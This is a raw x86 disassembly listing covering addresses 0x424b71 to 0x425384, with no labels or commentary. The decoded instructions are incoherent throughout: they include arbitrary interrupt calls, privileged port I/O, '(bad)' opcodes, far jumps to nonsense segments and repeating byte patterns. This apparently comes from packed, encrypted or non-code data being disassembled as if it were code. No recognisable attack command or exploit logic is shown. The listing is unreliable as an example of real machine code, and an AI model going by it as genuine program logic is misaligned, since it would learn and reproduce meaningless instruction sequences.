  424b71:	add    BYTE PTR [eax],al
  424b73:	mov    bl,BYTE PTR [edi-0x69f5ca7a]
  424b79:	add    ecx,ecx
  424b7b:	jbe    0x424b82
  424b7d:	and    bl,BYTE PTR [edi-0x72f5ca7a]
  424b83:	or     ecx,ecx
  424b85:	jbe    0x424b53
  424b87:	inc    ecx
  424b88:	lahf   
  424b89:	xchg   BYTE PTR ds:0xc91d8d0a,dh
  424b8f:	jbe    0x424bb6
  424b91:	pusha  
  424b92:	lahf   
  424b93:	xchg   BYTE PTR ds:0x493d76c9,dh
  424b99:	and    DWORD PTR [esi-0x3292c4cb],eax
  424b9f:	int3   
  424ba0:	push   es
  424ba1:	jo     0x424ba3
  424ba3:	add    BYTE PTR [eax],al
  424ba5:	shr    ebx,cl
  424ba7:	xchg   edx,eax
  424ba8:	add    DWORD PTR [edx],eax
  424baa:	scas   eax,DWORD PTR es:[edi]
  424bab:	or     esp,ecx
  424bad:	test   DWORD PTR [eax+eax*1+0x0],eax
  424bb1:	add    BYTE PTR [esp+eax*1-0x7],ch
  424bb5:	sbb    al,BYTE PTR [edx+0x1108cdb9]
  424bbb:	add    DWORD PTR [eax+0x74cfcf80],0x71000000
  424bc5:	add    BYTE PTR [eax-0x7c],dh
  424bc8:	int    0xb3
  424bca:	adc    DWORD PTR [ecx+0x17cf8080],eax
  424bd0:	inc    esp
  424bd1:	add    BYTE PTR [eax],al
  424bd3:	add    BYTE PTR [edx+0x70],ah
  424bd6:	add    BYTE PTR [ecx-0x78],dh
  424bd9:	or     dh,BYTE PTR [esi+0x7d]
  424bdc:	iret   
  424bdd:	jbe    0x424b9c
  424bdf:	jo     0x424bae
  424be1:	or     BYTE PTR ds:0x808081,ah
  424be7:	push   eax
  424be8:	int    0x76
  424bea:	jge    0x424bec
  424bec:	icebp  
  424bed:	int    0x76
  424bef:	std    
  424bf0:	int    0x8d
  424bf2:	std    
  424bf3:	cmp    edi,DWORD PTR [ecx+0x4]
  424bf6:	add    bh,bh
  424bf8:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424bfe:	push   ebx
  424bff:	ror    DWORD PTR [edx],cl
  424c01:	jbe    0x424c10
  424c03:	int    0x8d
  424c05:	std    
  424c06:	int    0x76
  424c08:	std    
  424c09:	cmp    ecx,DWORD PTR [edi]
  424c0b:	add    al,0x11
  424c0d:	call   ebx
  424c0f:	lods   eax,DWORD PTR ds:[esi]
  424c10:	sub    bl,dl
  424c12:	jmp    0x424ba6
  424c14:	push   ebx
  424c15:	jge    0x424be4
  424c17:	jbe    0x424bd6
  424c19:	inc    ebx
  424c1a:	rcl    esp,cl
  424c1c:	xchg   esi,eax
  424c1d:	or     dh,BYTE PTR [esi+0x75]
  424c20:	in     al,dx
  424c21:	das    
  424c22:	int    0x80
  424c24:	int    0x8d
  424c26:	jne    0x424c32
  424c28:	jbe    0x424be7
  424c2a:	int    0x76
  424c2c:	mov    ebp,0x4dd4d343
  424c31:	int    0x70
  424c33:	sbb    al,0xcd
  424c35:	mov    bl,0x25
  424c37:	add    DWORD PTR [eax-0x29cebc80],0x25b3cdb5
  424c41:	add    DWORD PTR [eax+0x1c70cd80],0x3ad63143
  424c4b:	int    0xb3
  424c4d:	sub    eax,0xcd808081
  424c52:	xchg   esi,eax
  424c53:	dec    esp
  424c54:	int    0x62
  424c56:	cmp    al,0x87
  424c58:	xor    DWORD PTR [edx],ecx
  424c5a:	jo     0x424c80
  424c5c:	int    0x76
  424c5e:	stc    
  424c5f:	int    0x8d
  424c61:	stc    
  424c62:	cmp    edi,DWORD PTR [ecx+0x4]
  424c65:	add    bh,bh
  424c67:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424c6d:	push   ebx
  424c6e:	ror    DWORD PTR [edx],cl
  424c70:	jbe    0x424c7f
  424c72:	int    0x96
  424c74:	and    al,0x9a
  424c76:	pop    ebx
  424c77:	mov    ebp,0xf5e2
  424c7c:	push   es
  424c7d:	ins    DWORD PTR es:[edi],dx
  424c7e:	das    
  424c7f:	add    eax,0x80808099
  424c84:	add    dh,dl
  424c86:	and    al,0xcd
  424c88:	lock pop ebx
  424c8a:	mov    ebp,0xf52c
  424c8f:	push   es
  424c90:	ins    DWORD PTR es:[edi],dx
  424c91:	das    
  424c92:	add    eax,0x808080c5
  424c97:	int    0x76
  424c99:	and    al,0xcd
  424c9b:	lock int 0xd5
  424c9e:	mov    ebp,0xfbe7
  424ca3:	push   es
  424ca4:	ins    DWORD PTR es:[edi],dx
  424ca5:	das    
  424ca6:	add    eax,0x808080d1
  424cab:	call   0x0:0xf90ebd5b
  424cb2:	push   es
  424cb3:	ins    DWORD PTR es:[edi],dx
  424cb4:	das    
  424cb5:	add    eax,0x8080802d
  424cba:	int    0x8
  424cbc:	and    eax,0x43808081
  424cc1:	sbb    al,0xd6
  424cc3:	sbb    cl,ch
  424cc5:	or     BYTE PTR [ecx],dl
  424cc7:	add    DWORD PTR [eax-0x52723080],0xadd60071
  424cd1:	int    0x8d
  424cd3:	dec    esp
  424cd4:	add    BYTE PTR [ecx+0x70005b94],dl
  424cda:	and    al,0xcd
  424cdc:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424ce2:	or     ch,0x7d
  424ce5:	cmp    ecx,DWORD PTR [edi]
  424ce7:	add    al,0x11
  424ce9:	call   ebx
  424ceb:	jmp    0x424c7f
  424ced:	shr    DWORD PTR [ebp-0x2b82acd8],cl
  424cf3:	(bad)
  424cf7:	dec    ecx
  424cf8:	and    BYTE PTR [esi-0x778932cb],al
  424cfe:	int    0x8d
  424d00:	mov    ch,cl
  424d02:	jbe    0x424d28
  424d04:	shr    ebx,cl
  424d06:	xchg   edx,eax
  424d07:	adc    al,BYTE PTR [edx]
  424d09:	scas   eax,DWORD PTR es:[edi]
  424d0a:	cmp    DWORD PTR [eax+0x7c89b880],eax
  424d10:	sbb    ch,cl
  424d12:	ins    BYTE PTR es:[edi],dx
  424d13:	cmp    al,0xcd
  424d15:	lea    ebp,[edi+eax*4]
  424d18:	lds    ecx,FWORD PTR [edx]
  424d1a:	outs   dx,BYTE PTR ds:[esi]
  424d1b:	adc    al,0xcd
  424d1d:	jbe    0x424d4b
  424d1f:	leave  
  424d20:	add    BYTE PTR [edi-0x327f7f80],0x76
  424d27:	sub    al,0xa
  424d29:	pushf  
  424d2a:	test   ch,cl
  424d2c:	jbe    0x424d5e
  424d2e:	int    0x8d
  424d30:	sub    al,0xa
  424d32:	outs   dx,BYTE PTR ds:[esi]
  424d33:	mov    ch,cl
  424d35:	jbe    0x424d4b
  424d37:	int    0x8d
  424d39:	sub    al,0xa
  424d3b:	outs   dx,BYTE PTR ds:[esi]
  424d3c:	dec    esp
  424d3d:	in     al,dx
  424d3e:	adc    al,0xcd
  424d40:	jbe    0x424d66
  424d42:	int    0x6c
  424d44:	cmp    al,0xcd
  424d46:	lea    ebp,[edi+eax*4]
  424d49:	lds    ecx,FWORD PTR [edx]
  424d4b:	outs   dx,BYTE PTR ds:[esi]
  424d4c:	adc    al,0xcd
  424d4e:	jbe    0x424d7c
  424d50:	add    al,0x2c
  424d52:	or     cl,0x76
  424d55:	icebp  
  424d56:	add    DWORD PTR [eax-0x19fb7f80],0x92d680f1
  424d60:	cmp    ebx,ebp
  424d62:	int    0xc5
  424d64:	arpl   sp,bp
  424d66:	xchg   edx,eax
  424d67:	cmp    ebp,DWORD PTR [ebp-0x56]
  424d6a:	test   al,0xcb
  424d6c:	shl    BYTE PTR [eax+eax*4],cl
  424d6f:	xchg   esi,eax
  424d70:	int    0xed
  424d72:	jno    0x424de5
  424d74:	das    
  424d75:	mov    ebx,0x74cf146e
  424d7a:	mov    BYTE PTR [edi+ebp*1],bl
  424d7d:	mov    ebx,0x9a5b867e
  424d82:	leave  
  424d83:	jbe    0x424d82
  424d85:	dec    ecx
  424d86:	and    DWORD PTR [esi-0x672f5cb],eax
  424d8c:	push   es
  424d8d:	retf   
  424d8e:	aam    0xb4
  424d90:	popa   
  424d91:	shl    DWORD PTR [ecx],1
  424d93:	xchg   BYTE PTR ds:0xcd4c7ccd,dh
  424d99:	out    0x88,al
  424d9b:	xchg   edx,edi
  424d9d:	pop    esi
  424d9e:	out    0x4c,al
  424da0:	or     BYTE PTR [ebp-0x33],0xdc
  424da4:	mov    BYTE PTR [edi-0x77197806],al
  424daa:	pop    esi
  424dab:	out    0x4c,al
  424dad:	cmp    BYTE PTR [edx-0x33],0x8d
  424db1:	std    
  424db2:	int    0xe6
  424db4:	std    
  424db5:	cmp    edx,DWORD PTR [ebx]
  424db7:	add    al,0xf8
  424db9:	call   ebx
  424dbb:	jmp    0xd41e1ae8
  424dc0:	in     al,dx
  424dc1:	xchg   edx,eax
  424dc2:	push   ebx
  424dc3:	cld    
  424dc4:	add    al,0xf2
  424dc6:	std    
  424dc7:	add    al,0xd3
  424dc9:	test   BYTE PTR [ebp*2+0x10d37a3c],al
  424dd0:	sub    BYTE PTR [ebx-0x6],dl
  424dd3:	adc    bh,al
  424dd5:	dec    ecx
  424dd6:	and    DWORD PTR [esi-0x2197ecb],eax
  424ddc:	int    0x8d
  424dde:	std    
  424ddf:	int    0xe6
  424de1:	std    
  424de2:	cmp    edx,DWORD PTR [ebx]
  424de4:	add    al,0xf8
  424de6:	call   ebx
  424de8:	jmp    0x424d7c
  424dea:	shr    ecx,cl
  424dec:	sub    BYTE PTR [ebx-0x10],dl
  424def:	inc    ebx
  424df0:	(bad)  
  424df1:	stc    
  424df2:	xor    BYTE PTR [ecx+0x63aa6d3b],0xcb
  424df9:	ror    BYTE PTR [eax-0x12326980],cl
  424dff:	add    al,0xed
  424e01:	push   eax
  424e02:	leave  
  424e03:	jbe    0x424daa
  424e05:	mov    edx,0xc98080ac
  424e0a:	jbe    0x424dc1
  424e0c:	xchg   eax,ecx
  424e0e:	add    BYTE PTR [eax-0x68528937],0x40
  424e15:	add    BYTE PTR [eax-0x51068937],0x30
  424e1c:	test   BYTE PTR [eax-0x4a028937],al
  424e22:	lods   al,BYTE PTR ds:[esi]
  424e23:	add    BYTE PTR [eax+0x69f176c9],0x53
  424e2a:	add    BYTE PTR [eax-0x76a8937],0x42
  424e31:	add    BYTE PTR [eax-0x78628937],0x80
  424e38:	add    BYTE PTR [eax-0x2c428937],0xb8
  424e3f:	add    BYTE PTR [eax-0x32128937],0x71
  424e46:	add    BYTE PTR [eax-0x1dee8937],0xb6
  424e4d:	add    BYTE PTR [eax+0x5dfd8dcd],0x8b
  424e54:	mov    al,BYTE PTR [eax-0x322ccc80]
  424e5a:	(bad)  
  424e5b:	stc    
  424e5c:	cmp    ebx,edx
  424e5e:	clc    
  424e5f:	add    bl,BYTE PTR [eax+0x127dcd9a]
  424e65:	repnz popa 
  424e67:	and    al,BYTE PTR [eax-0x7a34ed80]
  424e6d:	mov    BYTE PTR [eax+0x42021280],0xa4
  424e74:	add    BYTE PTR [eax+0x3cded312],0x80
  424e7b:	or     cl,0x76
  424e7e:	cmc    
  424e7f:	icebp  
  424e80:	lea    eax,[eax-0x2893680]
  424e86:	jnp    0x424e5c
  424e88:	add    BYTE PTR [eax+0x18f976c9],0x30
  424e8f:	add    BYTE PTR [eax-0x32068933],0x96
  424e96:	std    
  424e97:	ss dec eax
  424e99:	pushf  
  424e9a:	add    BYTE PTR [eax+0x7687d23b],0xf5
  424ea1:	int    0xe3
  424ea3:	push   esi
  424ea4:	jp     0x424ea5
  424ea6:	add    BYTE PTR [eax-0x69f50ecd],0xfd
  424ead:	int    0x76
  424eaf:	std    
  424eb0:	xchg   DWORD PTR [esi-0x78],esi
  424eb3:	int    0x96
  424eb5:	std    
  424eb6:	xchg   DWORD PTR [esi+0x922ca4c],edx
  424ebc:	xor    ch,cl
  424ebe:	jbe    0x424ed1
  424ec0:	int    0x96
  424ec2:	in     eax,dx
  424ec3:	sbb    BYTE PTR ss:[edi-0x80],cl
  424ec7:	cmp    BYTE PTR [ebx],0xd2
  424eca:	int    0x96
  424ecc:	mov    ebp,0xe261d253
  424ed1:	fadd   DWORD PTR [eax-0x320ecc80]
  424ed7:	jbe    0x424e8e
  424ed9:	xchg   DWORD PTR [ebx],edx
  424edb:	popa   
  424edc:	fist   WORD PTR [eax+eax*4-0x80]
  424ee0:	xor    esi,ecx
  424ee2:	xchg   DWORD PTR [esi-0x5a893253],edx
  424ee8:	int    0xd6
  424eea:	xor    ch,cl
  424eec:	out    0x9d,al
  424eee:	adc    bh,bl
  424ef0:	mov    DWORD PTR [ecx-0x80],esi
  424ef3:	sub    BYTE PTR [ebx],0xf1
  424ef6:	int    0x76
  424ef8:	xchg   ebp,eax
  424ef9:	adc    bh,bl
  424efb:	mov    dh,0x2c
  424efd:	add    BYTE PTR [eax-0x25c404cd],0xf8
  424f04:	clc    
  424f05:	int    0x96
  424f07:	icebp  
  424f08:	push   esi
  424f09:	out    0x1e,al
  424f0b:	add    BYTE PTR [eax-0x1c322dd5],0x33
  424f12:	icebp  
  424f13:	adc    dh,bl
  424f15:	pop    es
  424f16:	push   edx
  424f17:	add    BYTE PTR [eax+0x72f9943],0x63
  424f1e:	add    BYTE PTR [eax],al
  424f20:	add    BYTE PTR [edx+0x4cd2cba8],ch
  424f26:	adc    BYTE PTR [esi-0x12fb1233],0x74
  424f2d:	pop    ebx
  424f2e:	cwde   
  424f2f:	call   0x8043:0xd9ed76c9
  424f36:	or     cl,0x76
  424f39:	adc    DWORD PTR [edx+0x7e],esi
  424f3c:	add    BYTE PTR [eax+0x5ff576c9],0x71
  424f43:	add    BYTE PTR [eax+0xbf976c9],0x71
  424f4a:	add    BYTE PTR [eax+0x29fd76c9],0x2c
  424f51:	add    BYTE PTR [eax-0x275a8937],0x58
  424f58:	add    BYTE PTR [eax+0x76ad76c9],0x84
  424f5f:	add    BYTE PTR [eax+0x6cb576c9],0x8c
  424f66:	add    BYTE PTR [eax+0x1abd76c9],0x5e
  424f6d:	add    BYTE PTR [eax-0x449a8937],0x6f
  424f74:	add    BYTE PTR [eax+0x4a6d76c9],0x80
  424f7b:	add    BYTE PTR [eax+0x4d7576c9],0x38
  424f82:	add    BYTE PTR [eax+0x1f7d76c9],0x28
  424f89:	add    BYTE PTR [eax-0x44f28937],0x4d
  424f90:	add    BYTE PTR [eax-0x1b0e8937],0x1c
  424f97:	add    BYTE PTR [eax-0x32528933],0x8d
  424f9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f9f:	dec    ebp
  424fa0:	bound  ebp,QWORD PTR [ebx]
  424fa2:	add    BYTE PTR [eax-0x7f59c2ba],0x80
  424fa9:	dec    ebp
  424faa:	pop    ds
  424fab:	and    eax,DWORD PTR [eax-0x2c2ed080]
  424fb1:	pop    edi
  424fb2:	xchg   ecx,eax
  424fb3:	mov    bh,0x7e
  424fb5:	stc    
  424fb6:	xor    edi,DWORD PTR [ebp-0x33]
  424fb9:	jbe    0x424fb8
  424fbb:	int    0x96
  424fbd:	stc    
  424fbe:	sub    edx,edx
  424fc0:	int    0x96
  424fc2:	cmc    
  424fc3:	dec    ebp
  424fc4:	inc    edi
  424fc5:	outs   dx,DWORD PTR ds:[esi]
  424fc6:	add    BYTE PTR [eax-0x69322dcd],0x11
  424fcd:	xor    edx,edx
  424fcf:	int    0x96
  424fd1:	in     eax,dx
  424fd2:	push   ebx
  424fd3:	sar    BYTE PTR [ebx],cl
  424fd5:	fisubr DWORD PTR [ecx-0x27]
  424fd8:	ret    
  424fd9:	add    BYTE PTR [eax],al
  424fdb:	clc    
  424fdc:	test   ebp,0x72c34c96
  424fe2:	push   ds
  424fe3:	add    BYTE PTR [eax+0x76cdf133],0xbd
  424fea:	int    0xd6
  424fec:	mov    ch,0x33
  424fee:	leave  
  424fef:	das    
  424ff0:	sar    DWORD PTR [ecx+0x69],1
  424ff3:	fisttp DWORD PTR [edx]
  424ff5:	xchg   ecx,eax
  424ff6:	mov    ebx,ebp
  424ff8:	popa   
  424ff9:	add    BYTE PTR [eax-0x6a893680],0x9b
  425000:	push   esp
  425001:	add    BYTE PTR [eax+0x2d9d76c9],0x6f
  425008:	add    BYTE PTR [eax+0x1ad76c9],0xa4
  42500f:	add    BYTE PTR [eax-0x7e5a8937],0x80
  425016:	add    BYTE PTR [eax+0x3ba5a6cd],0xda
  42501d:	pop    ebp
  42501e:	call   0xcdf4:0xf880806f
  425025:	xchg   esi,eax
  425026:	lods   eax,DWORD PTR ds:[esi]
  425027:	int    0xa6
  425029:	mov    BYTE PTR [ebx-0x2e],dl
  42502c:	int    0x96
  42502e:	popf   
  42502f:	xor    edx,edx
  425031:	int    0x96
  425033:	xchg   ebp,eax
  425034:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  425036:	push   eax
  425037:	add    BYTE PTR [eax-0x302d2ed1],0x5
  42503e:	mov    BYTE PTR [eax+0x2c],bl
  425041:	ret    0xafd
  425044:	jbe    0x424fdb
  425046:	int    0x76
  425048:	icebp  
  425049:	int    0x96
  42504b:	or     eax,0xf3f7f534
  425050:	int    0x96
  425052:	xchg   ebp,eax
  425053:	xor    al,0x23
  425055:	inc    esp
  425056:	test   DWORD PTR [ebp+edx*8-0x7c],ecx
  42505a:	inc    esi
  42505b:	or     DWORD PTR [eax+eiz*1+0x4d7d76cd],eax
  425062:	rol    esi,0x80
  425065:	add    BYTE PTR [edi-0x59328a8a],0x6d
  42506c:	cmp    ebx,edx
  42506e:	clc    
  42506f:	hlt    
  425070:	int    0x96
  425072:	gs mov edi,0xc3d9
  425078:	ss aaa 
  42507a:	push   esi
  42507b:	add    BYTE PTR [eax+0xc56d233],0x6d
  425082:	add    BYTE PTR [eax],al
  425084:	xchg   DWORD PTR [ebp-0x33],edi
  425087:	jbe    0x425086
  425089:	int    0x96
  42508b:	stc    
  42508c:	sub    edx,edx
  42508e:	int    0x96
  425090:	cmc    
  425091:	dec    ebp
  425092:	inc    edi
  425093:	outs   dx,DWORD PTR ds:[esi]
  425094:	add    BYTE PTR [eax-0x69322dcd],0x11
  42509b:	xor    edx,edx
  42509d:	int    0x96
  42509f:	in     eax,dx
  4250a0:	push   ebx
  4250a1:	sar    BYTE PTR [ebx],cl
  4250a3:	(bad)  
  4250a5:	hlt    
  4250a6:	int    0x96
  4250a8:	dec    esp
  4250a9:	xor    esi,ecx
  4250ab:	int    0x76
  4250ad:	mov    ebp,0x33b5a6cd
  4250b2:	leave  
  4250b3:	das    
  4250b4:	rol    ebp,1
  4250b6:	int    0xdb
  4250b8:	xor    ebx,DWORD PTR [ebp-0x1dbc5679]
  4250be:	das    
  4250bf:	pop    es
  4250c0:	pop    esp
  4250c1:	add    BYTE PTR [eax],al
  4250c3:	add    BYTE PTR [edx-0x2d349c58],ch
  4250c9:	mov    BYTE PTR [eax+0x4edcd96],al
  4250cf:	in     eax,dx
  4250d0:	jo     0x42509b
  4250d2:	jbe    0x4250a4
  4250d4:	xchg   ecx,eax
  4250d5:	aaa    
  4250d6:	ficom  WORD PTR [ebx]
  4250d8:	pop    ebp
  4250d9:	mov    ebp,0xa25230a
  4250de:	jbe    0x425135
  4250e0:	leave  
  4250e1:	jbe    0x425140
  4250e3:	mov    esi,0xa13de37
  4250e8:	jbe    0x42514f
  4250ea:	leave  
  4250eb:	jbe    0x42515a
  4250ed:	fidiv  WORD PTR [edi]
  4250ef:	ficom  WORD PTR [ebx]
  4250f1:	or     dh,BYTE PTR [esi+0x75]
  4250f4:	pop    ebx
  4250f5:	leave  
  4250f6:	jbe    0x425175
  4250f8:	scas   al,BYTE PTR es:[edi]
  4250f9:	aaa    
  4250fa:	ficom  WORD PTR [ebx]
  4250fc:	or     dh,BYTE PTR [esi+0xd]
  4250ff:	cwde   
  425100:	call   0xde37:0x96f176c9
  425107:	adc    ecx,DWORD PTR [edx]
  425109:	jbe    0x4250a0
  42510b:	cmp    ebx,edx
  42510d:	cmp    eax,DWORD PTR [eax]
  42510f:	pop    edi
  425110:	dec    ecx
  425111:	and    DWORD PTR [esi-0x628936cb],eax
  425117:	out    0x37,al
  425119:	ficom  WORD PTR [ebx]
  42511b:	jp     0x425127
  42511d:	jbe    0x4250c4
  42511f:	int    0xd3
  425121:	or     dl,BYTE PTR [esi-0x4a19f513]
  425127:	iret   
  425128:	xchg   ecx,eax
  425129:	add    DWORD PTR [ecx+edx*1],0x28add3ff
  425130:	push   ebx
  425131:	ror    bh,cl
  425133:	je     0x4250fc
  425135:	ror    ch,1
  425137:	xor    ch,cl
  425139:	pushf  
  42513a:	test   BYTE PTR [edi],ch
  42513c:	inc    ebp
  42513d:	loop   0x4250d1
  42513f:	shr    esp,cl
  425141:	xchg   edx,eax
  425142:	int    0x1c
  425144:	int    0x6c
  425146:	test   BYTE PTR [ebx],bh
  425148:	ins    DWORD PTR es:[edi],dx
  425149:	adc    bh,bl
  42514b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42514c:	mov    esi,0xf1534229
  425151:	or     dl,BYTE PTR [esi-0x6893207]
  425157:	xchg   DWORD PTR [ebp-0x2d],ebp
  42515a:	in     eax,0x28
  42515c:	inc    ebx
  42515d:	jbe    0x4251ab
  42515f:	das    
  425160:	or     BYTE PTR [edi-0x327f7f80],bh
  425166:	jbe    0x425161
  425168:	add    al,0xb6
  42516a:	mov    ebp,0x11e60a80
  42516f:	int    0x76
  425171:	stc    
  425172:	push   es
  425173:	ins    DWORD PTR es:[edi],dx
  425174:	aam    0xb6
  425176:	cmp    ebp,DWORD PTR [ebp+0xa]
  425179:	out    0xf5,al
  42517b:	int    0x96
  42517d:	mov    ebp,0xcf88a6cd
  425182:	fs xor ch,cl
  425185:	xchg   esi,eax
  425186:	mov    BYTE PTR [edi-0x5269f527],al
  42518c:	retf   0x922
  42518f:	xchg   esi,eax
  425190:	add    ch,cl
  425192:	xchg   esi,eax
  425193:	stc    
  425194:	xchg   ecx,ebx
  425196:	retf   0x2014
  425199:	int    0xa6
  42519b:	lods   eax,DWORD PTR ds:[esi]
  42519c:	or     DWORD PTR [ebx],ebx
  42519e:	retf   0x96
  4251a1:	int    0xa6
  4251a3:	stc    
  4251a4:	xchg   ecx,esp
  4251a6:	int    0xe6
  4251a8:	mov    BYTE PTR [ecx],cl
  4251aa:	adc    al,0x43
  4251ac:	int    0x96
  4251ae:	cmc    
  4251af:	ins    BYTE PTR es:[edi],dx
  4251b0:	add    al,0xea
  4251b2:	std    
  4251b3:	sar    DWORD PTR [ebp-0x7b2dfbd8],cl
  4251b9:	push   ebx
  4251ba:	sar    BYTE PTR [ebx],cl
  4251bc:	ror    DWORD PTR [edx],cl
  4251be:	jbe    0x4251b5
  4251c0:	push   ecx
  4251c1:	(bad)  
  4251c2:	cmc    
  4251c3:	int    0x96
  4251c5:	cmc    
  4251c6:	add    al,0x11
  4251c8:	call   ebx
  4251ca:	repz xchg edx,eax
  4251cc:	shr    DWORD PTR [ebp-0x322dacd8],cl
  4251d2:	xchg   esi,eax
  4251d3:	stc    
  4251d4:	inc    ebx
  4251d5:	rol    BYTE PTR [edx+0x7a003ba7],cl
  4251db:	int    0x76
  4251dd:	adc    ebp,ecx
  4251df:	xchg   esi,eax
  4251e0:	stc    
  4251e1:	int    0xa6
  4251e3:	mov    ebp,0xcffdad04
  4251e8:	test   cl,dh
  4251ea:	int    0x96
  4251ec:	stc    
  4251ed:	iret   
  4251ee:	adc    al,0x5b
  4251f0:	int    0xa6
  4251f2:	dec    esp
  4251f3:	shl    ebx,cl
  4251f5:	sub    BYTE PTR [ebx-0x2e],dl
  4251f8:	cmp    edx,ebx
  4251fa:	or     dh,BYTE PTR [esi+0x11]
  4251fd:	push   ecx
  4251fe:	(bad)  
  4251ff:	adc    ebp,ecx
  425201:	xchg   esi,eax
  425202:	adc    DWORD PTR [ecx+edx*1],eax
  425205:	call   ebx
  425207:	repz xchg edx,eax
  425209:	shr    DWORD PTR [ebp-0x322dacd8],cl
  42520f:	xchg   esi,eax
  425210:	stc    
  425211:	xchg   edx,ebx
  425213:	xor    esp,edx
  425215:	or     dh,BYTE PTR [esi-0x43]
  425218:	inc    ebx
  425219:	lds    ebp,FWORD PTR [edi]
  42521b:	pop    es
  42521c:	outs   dx,DWORD PTR ds:[esi]
  42521d:	add    BYTE PTR [eax],al
  42521f:	add    ch,cl
  425221:	jbe    0x425210
  425223:	int    0x96
  425225:	mov    ch,0x4
  425227:	jmp    0xd384:0xd2046cfd
  42522e:	mov    ebp,0x3bd25328
  425233:	ror    ebp,cl
  425235:	popf   
  425236:	int    0xf1
  425238:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  42523e:	in     eax,0x28
  425240:	or     dl,BYTE PTR [esi-0x6d0c2c4b]
  425246:	or     ah,BYTE PTR [esi-0x12697613]
  42524c:	add    al,0xe6
  42524e:	in     eax,dx
  42524f:	xchg   BYTE PTR [edi],ch
  425251:	or     edx,DWORD PTR [ebp-0x55ffff01]
  425257:	test   al,0x63
  425259:	retf   
  42525a:	ror    BYTE PTR [eax-0x12326980],cl
  425260:	add    al,0xed
  425262:	adc    al,0xcd
  425264:	jbe    0x4251ee
  425266:	leave  
  425267:	jbe    0x42527a
  425269:	dec    ecx
  42526a:	and    DWORD PTR [esi-0x28936cb],eax
  425270:	inc    ecx
  425271:	and    DWORD PTR [esi+0x5b80cd35],eax
  425277:	cwde   
  425278:	or     dh,BYTE PTR [esi-0x7]
  42527b:	leave  
  42527c:	jbe    0x425273
  42527e:	into   
  42527f:	and    DWORD PTR [esi+0x76c99a35],eax
  425285:	in     eax,dx
  425286:	inc    esi
  425287:	sbb    DWORD PTR [ebp-0x22932de],esi
  42528d:	int    0x8d
  42528f:	std    
  425290:	sar    bh,0x5d
  425293:	shl    DWORD PTR [ecx],1
  425295:	xchg   BYTE PTR ds:0xd3f03baa,dh
  42529b:	repnz sub BYTE PTR [ebx],bh
  42529e:	adc    ebx,edx
  4252a0:	out    dx,eax
  4252a1:	xchg   edx,eax
  4252a2:	push   ebx
  4252a3:	add    cl,ch
  4252a5:	lea    edx,[ecx]
  4252a7:	int    0x96
  4252a9:	adc    DWORD PTR [ebx],edi
  4252ab:	jge    0x4252e8
  4252ad:	(bad)  
  4252af:	jmp    0x425243
  4252b1:	shr    edx,cl
  4252b3:	sub    BYTE PTR [ebx+0x13],dl
  4252b6:	das    
  4252b7:	rol    DWORD PTR [edx],1
  4252b9:	jmp    0x42525a
  4252bb:	add    BYTE PTR [eax-0x6723280],0xcd
  4252c2:	xchg   esi,eax
  4252c3:	stc    
  4252c4:	cmp    ebx,ecx
  4252c6:	shr    edx,cl
  4252c8:	sub    BYTE PTR [ebx],bh
  4252ca:	jge    0x42529f
  4252cc:	jmp    0x425260
  4252ce:	push   ebx
  4252cf:	adc    ecx,ebp
  4252d1:	xchg   esi,eax
  4252d2:	std    
  4252d3:	int    0xa6
  4252d5:	std    
  4252d6:	cmp    esi,ecx
  4252d8:	cmp    esp,ecx
  4252da:	shl    ebx,cl
  4252dc:	xchg   edx,eax
  4252dd:	shl    ebp,cl
  4252df:	sub    BYTE PTR [ebx-0x2b],dl
  4252e2:	push   es
  4252e3:	adc    ecx,ebp
  4252e5:	xchg   esi,eax
  4252e6:	stc    
  4252e7:	int    0x8d
  4252e9:	stc    
  4252ea:	aam    0x58
  4252ec:	cmp    esi,eax
  4252ee:	shl    edx,cl
  4252f0:	sub    BYTE PTR [ebx],bh
  4252f2:	icebp  
  4252f3:	shl    ebx,cl
  4252f5:	xchg   edx,eax
  4252f6:	push   ebx
  4252f7:	jecxz  0x4252c6
  4252f9:	(bad)  
  4252fa:	std    
  4252fb:	int    0xa6
  4252fd:	std    
  4252fe:	cmp    edi,DWORD PTR [ebp+0x3b]
  425301:	loope  0x4252d6
  425303:	jmp    0x425297
  425305:	shl    ebp,cl
  425307:	sub    BYTE PTR [ebx+0xc],dl
  42530a:	aad    0xf3
  42530c:	int    0x8d
  42530e:	in     eax,dx
  42530f:	int    0xa6
  425311:	in     eax,dx
  425312:	cmp    edi,DWORD PTR [ebp+0x3b]
  425315:	loope  0x4252ea
  425317:	jmp    0x4252ab
  425319:	shl    ebp,cl
  42531b:	sub    BYTE PTR [ebx+0xc],dl
  42531e:	cmp    esp,ebx
  425320:	in     al,dx
  425321:	sub    al,0x3b
  425323:	lock shl edx,cl
  425326:	sub    BYTE PTR [ebx],bh
  425328:	icebp  
  425329:	shl    ebx,cl
  42532b:	xchg   edx,eax
  42532c:	push   ebx
  42532d:	jecxz  0x4252fc
  42532f:	(bad)  
  425330:	std    
  425331:	int    0xa6
  425333:	std    
  425334:	cmp    edi,DWORD PTR [ebp+0x3b]
  425337:	loope  0x42530c
  425339:	jmp    0x4252cd
  42533b:	shl    ebp,cl
  42533d:	sub    BYTE PTR [ebx+0xc],dl
  425340:	aad    0xf3
  425342:	or     dl,BYTE PTR [esi-0x2723207]
  425348:	int    0x96
  42534a:	std    
  42534b:	cmp    edi,DWORD PTR [ebp+0x3b]
  42534e:	(bad)  
  425350:	jmp    0x4252e4
  425352:	shr    edx,cl
  425354:	sub    BYTE PTR [ebx+0x13],dl
  425357:	xchg   DWORD PTR [edx],eax
  425359:	int    0x8d
  42535b:	cmc    
  42535c:	int    0x96
  42535e:	cmc    
  42535f:	cmp    ebx,ecx
  425361:	cmp    edi,DWORD PTR [ebp-0x2d]
  425364:	jmp    0x1353:0x92ebd328
  42536b:	int    0x96
  42536d:	std    
  42536e:	int    0xa6
  425370:	std    
  425371:	cmp    esi,ecx
  425373:	cmp    esp,ecx
  425375:	shl    ebp,cl
  425377:	sub    bl,dl
  425379:	repz xchg edx,eax
  42537b:	push   ebx
  42537c:	aad    0x33
  42537e:	adc    eax,DWORD PTR [ebx+0x2]
  425381:	das    
  425382:	pop    es
  425383:	pop    edx
  425384:	add    BYTE PTR [eax],al
